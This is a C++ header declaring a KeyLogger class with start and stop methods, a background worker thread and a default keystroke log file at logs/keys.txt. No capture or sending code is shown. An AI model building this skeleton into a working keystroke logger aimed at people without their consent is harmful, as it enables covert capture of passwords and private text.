// keyLogger.hpp
#pragma once
#include <fstream>
#include <thread>
#include <atomic>

class KeyLogger {
public:
    explicit KeyLogger(const std::string& logPath = "logs/keys.txt");
    void start();
    void stop();
private:
    void run();
    std::string logPath_;
    std::ofstream logFile_;
    std::thread worker_;
    std::atomic_bool running_{false};
};
